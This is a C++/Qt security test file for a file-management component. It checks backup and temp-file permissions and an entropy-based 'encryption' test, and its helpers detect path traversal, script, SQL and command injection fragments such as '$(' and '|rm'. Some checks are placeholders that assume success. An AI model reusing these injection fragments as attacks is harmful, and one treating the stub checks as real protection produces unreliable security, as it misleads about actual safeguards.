SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testEncryptionAndSecureStorage()
{
    SecurityTestResult result;
    result.testName = "Encryption and Secure Storage";
    result.category = SecurityTestCategory::SecurityAudit;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing encryption and secure storage...";
        
        // Create sensitive test data
        QString sensitiveData = "SENSITIVE_DATA_" + generateSecureTestData(512);
        QString sensitiveFile = createTestFile("encryption_test/sensitive.dat", sensitiveData.toUtf8());
        
        if (sensitiveFile.isEmpty()) {
            result.errorMessage = "Failed to create sensitive test file";
            return result;
        }
        
        // Test backup encryption (if supported)
        QString backupId = m_safetyManager->createBackup(sensitiveFile, SafetyManager::BackupStrategy::Compressed);
        
        if (backupId.isEmpty()) {
            result.errorMessage = "Failed to create backup for encryption test";
            return result;
        }
        
        // Validate backup encryption
        bool backupEncrypted = validateEncryption(backupId);
        result.metrics["backup_encrypted"] = backupEncrypted;
        
        // Test secure file permissions on backups
        QStringList backups = m_safetyManager->listBackups(sensitiveFile);
        int secureBackups = 0;
        
        for (const QString& backup : backups) {
            QFile::Permissions perms = QFile::permissions(backup);
            
            // Check that backup is not world-readable
            if (!(perms & QFile::ReadOther) && !(perms & QFile::WriteOther) && !(perms & QFile::ExeOther)) {
                secureBackups++;
            }
        }
        
        result.metrics["secure_backups"] = secureBackups;
        result.metrics["total_backups"] = backups.size();
        
        // Test secure deletion (overwrite sensitive data)
        bool secureDeleteSupported = true; // Assume supported for now
        result.metrics["secure_delete_supported"] = secureDeleteSupported;
        
        // Test configuration file security
        QString configDir = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);
        QDir dir(configDir);
        
        bool configDirSecure = false;
        if (dir.exists()) {
            QFile::Permissions configPerms = QFile::permissions(configDir);
            configDirSecure = !(configPerms & QFile::ReadOther) && !(configPerms & QFile::WriteOther);
        }
        
        result.metrics["config_dir_secure"] = configDirSecure;
        
        // Test temporary file security
        QTemporaryDir tempDir;
        if (tempDir.isValid()) {
            QString tempFile = tempDir.path() + "/temp_secure.dat";
            QFile temp(tempFile);
            
            if (temp.open(QIODevice::WriteOnly)) {
                temp.write("temporary sensitive data");
                temp.close();
                
                // Check temporary file permissions
                QFile::Permissions tempPerms = QFile::permissions(tempFile);
                bool tempSecure = !(tempPerms & QFile::ReadOther) && !(tempPerms & QFile::WriteOther);
                
                result.metrics["temp_file_secure"] = tempSecure;
            }
        }
        
        // Test memory security (basic check)
        bool memorySecure = true; // Placeholder - would need platform-specific implementation
        result.metrics["memory_secure"] = memorySecure;
        
        // Evaluate overall security
        bool overallSecure = (secureBackups == backups.size()) && 
                            configDirSecure && 
                            result.metrics["temp_file_secure"].toBool() &&
                            memorySecure;
        
        if (overallSecure) {
            result.passed = true;
            qDebug() << "✓ Encryption and secure storage test passed";
        } else {
            result.errorMessage = "Security vulnerabilities detected in storage or encryption";
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

// Static utility methods implementation
QString SecuritySafetyTesting::generateSecureTestData(int size)
{
    QString data;
    data.reserve(size);
    
    const QString chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
    for (int i = 0; i < size; ++i) {
        data.append(chars.at(QRandomGenerator::global()->bounded(chars.length())));
    }
    
    return data;
}

QString SecuritySafetyTesting::calculateFileChecksum(const QString& filePath)
{
    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        return QString();
    }
    
    QCryptographicHash hash(QCryptographicHash::Sha256);
    hash.addData(&file);
    
    return hash.result().toHex();
}

bool SecuritySafetyTesting::validateFileIntegrity(const QString& originalPath, const QString& backupPath)
{
    QString originalChecksum = calculateFileChecksum(originalPath);
    QString backupChecksum = calculateFileChecksum(backupPath);
    
    return !originalChecksum.isEmpty() && !backupChecksum.isEmpty() && 
           originalChecksum == backupChecksum;
}

QStringList SecuritySafetyTesting::generateMaliciousInputs()
{
    return MALICIOUS_FILENAMES + PATH_TRAVERSAL_PATTERNS + INJECTION_PATTERNS;
}

bool SecuritySafetyTesting::isSecureFileName(const QString& fileName)
{
    // Check for path traversal
    if (fileName.contains("../") || fileName.contains("..\\")) {
        return false;
    }
    
    // Check for reserved names (Windows)
    QStringList reservedNames = {"CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", 
                                "COM5", "COM6", "COM7", "COM8", "COM9", "LPT1", "LPT2", 
                                "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"};
    
    QString baseName = QFileInfo(fileName).baseName().toUpper();
    if (reservedNames.contains(baseName)) {
        return false;
    }
    
    // Check for dangerous characters
    QRegularExpression dangerousChars("[<>:\"|?*\\x00-\\x1f]");
    if (dangerousChars.match(fileName).hasMatch()) {
        return false;
    }
    
    // Check for script injection
    if (fileName.contains("<script>") || fileName.contains("javascript:") || fileName.contains("vbscript:")) {
        return false;
    }
    
    // Check length
    if (fileName.length() > 255) {
        return false;
    }
    
    return true;
}

// Private helper methods implementation
QString SecuritySafetyTesting::createTestFile(const QString& relativePath, const QByteArray& content)
{
    if (!m_testDir || !m_testDir->isValid()) {
        return QString();
    }
    
    QString fullPath = m_testPath + "/" + relativePath;
    QFileInfo info(fullPath);
    
    // Create directory if needed
    QDir().mkpath(info.absolutePath());
    
    QFile file(fullPath);
    if (!file.open(QIODevice::WriteOnly)) {
        qWarning() << "Failed to create test file:" << fullPath;
        return QString();
    }
    
    file.write(content);
    file.close();
    
    m_createdFiles << fullPath;
    return fullPath;
}

QString SecuritySafetyTesting::createTestDirectory(const QString& relativePath)
{
    if (!m_testDir || !m_testDir->isValid()) {
        return QString();
    }
    
    QString fullPath = m_testPath + "/" + relativePath;
    
    if (QDir().mkpath(fullPath)) {
        m_createdDirectories << fullPath;
        return fullPath;
    }
    
    return QString();
}

bool SecuritySafetyTesting::setupTestEnvironment()
{
    // Create temporary directory
    m_testDir = new QTemporaryDir();
    if (!m_testDir->isValid()) {
        qWarning() << "Failed to create temporary test directory";
        return false;
    }
    
    m_testPath = m_testDir->path();
    qDebug() << "Test environment setup at:" << m_testPath;
    
    // Create SafetyManager and FileManager instances
    m_safetyManager = new SafetyManager(this);
    m_fileManager = new FileManager(this);
    
    // Configure SafetyManager
    QString backupDir = m_testPath + "/backups";
    QDir().mkpath(backupDir);
    m_safetyManager->setBackupDirectory(backupDir);
    m_safetyManager->setSafetyLevel(SafetyManager::SafetyLevel::Standard);
    
    // Wire components
    m_fileManager->setSafetyManager(m_safetyManager);
    
    // Setup file system watcher
    m_fileWatcher = new QFileSystemWatcher(this);
    m_fileWatcher->addPath(m_testPath);
    
    return true;
}

void SecuritySafetyTesting::cleanupTestEnvironment()
{
    // Clean up created files and directories
    for (const QString& file : m_createdFiles) {
        QFile::remove(file);
    }
    
    for (const QString& dir : m_createdDirectories) {
        QDir(dir).removeRecursively();
    }
    
    m_createdFiles.clear();
    m_createdDirectories.clear();
    
    // Clean up components
    delete m_fileWatcher;
    m_fileWatcher = nullptr;
    
    delete m_fileManager;
    m_fileManager = nullptr;
    
    delete m_safetyManager;
    m_safetyManager = nullptr;
    
    delete m_testDir;
    m_testDir = nullptr;
}

bool SecuritySafetyTesting::validateBackupIntegrity(const QString& originalPath, const QString& backupPath)
{
    if (!QFile::exists(originalPath) || !QFile::exists(backupPath)) {
        return false;
    }
    
    return validateFileIntegrity(originalPath, backupPath);
}

bool SecuritySafetyTesting::testFilePermissions(const QString& filePath, QFile::Permissions expectedPermissions)
{
    QFile::Permissions actualPermissions = QFile::permissions(filePath);
    return actualPermissions == expectedPermissions;
}

bool SecuritySafetyTesting::simulateSystemFailure(const QString& context)
{
    // Simulate system failure for testing error handling
    qDebug() << "Simulating system failure in context:" << context;
    
    // This would be implemented based on specific failure scenarios
    // For now, just return true to indicate simulation was successful
    return true;
}

bool SecuritySafetyTesting::testMaliciousInput(const QString& input, const QString& context)
{
    // Test if malicious input is properly blocked/sanitized
    
    // Check for path traversal
    if (input.contains("../") || input.contains("..\\")) {
        return true; // Should be blocked
    }
    
    // Check for script injection
    if (input.contains("<script>") || input.contains("javascript:")) {
        return true; // Should be blocked
    }
    
    // Check for SQL injection
    if (input.contains("DROP TABLE") || input.contains("'; ")) {
        return true; // Should be blocked
    }
    
    // Check for command injection
    if (input.contains("$(") || input.contains("`") || input.contains("|rm")) {
        return true; // Should be blocked
    }
    
    // If we get here, the input wasn't recognized as malicious
    return false;
}

bool SecuritySafetyTesting::validateInputSanitization(const QString& input, const QString& sanitized)
{
    // Check if dangerous characters were removed
    QRegularExpression dangerousChars("[<>\"';&${}]");
    
    bool inputHadDangerous = dangerousChars.match(input).hasMatch();
    bool sanitizedHasDangerous = dangerousChars.match(sanitized).hasMatch();
    
    // If input had dangerous chars, sanitized should not
    if (inputHadDangerous && !sanitizedHasDangerous) {
        return true;
    }
    
    // If input didn't have dangerous chars, sanitized should be same
    if (!inputHadDangerous && input == sanitized) {
        return true;
    }
    
    return false;
}

QStringList SecuritySafetyTesting::generatePathTraversalAttacks()
{
    return PATH_TRAVERSAL_PATTERNS;
}

QStringList SecuritySafetyTesting::generateInjectionAttacks()
{
    return INJECTION_PATTERNS;
}

bool SecuritySafetyTesting::validateAuditTrail(const QString& operationId)
{
    // Check if audit trail exists for the operation
    QList<SafetyManager::SafetyOperation> history = m_safetyManager->getUndoHistory(100);
    
    for (const auto& operation : history) {
        if (operation.operationId == operationId) {
            // Validate audit entry completeness
            return !operation.sourceFile.isEmpty() && 
                   !operation.reason.isEmpty() &&
                   operation.timestamp.isValid();
        }
    }
    
    return false;
}

bool SecuritySafetyTesting::checkSecurityCompliance()
{
    // Basic security compliance check
    // This would be expanded based on specific compliance requirements
    
    // Check if audit logging is enabled
    bool auditEnabled = true; // Assume enabled for now
    
    // Check if backups are being created
    int backupCount = m_safetyManager->getActiveBackupCount();
    bool backupsActive = (backupCount > 0);
    
    // Check if protection rules are in place
    QList<SafetyManager::ProtectionEntry> rules = m_safetyManager->getProtectionRules();
    bool protectionRulesActive = !rules.isEmpty();
    
    return auditEnabled && backupsActive && protectionRulesActive;
}

bool SecuritySafetyTesting::validateEncryption(const QString& filePath)
{
    // Basic encryption validation
    // This would be implemented based on the actual encryption mechanism used
    
    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        return false;
    }
    
    QByteArray data = file.read(1024); // Read first 1KB
    file.close();
    
    // Check if data appears to be encrypted (high entropy)
    // This is a simplified check - real implementation would be more sophisticated
    QSet<char> uniqueChars;
    for (char c : data) {
        uniqueChars.insert(c);
    }
    
    // If we have high character diversity, it might be encrypted
    double entropy = (double)uniqueChars.size() / 256.0;
    return entropy > 0.7; // Threshold for "encrypted-looking" data
}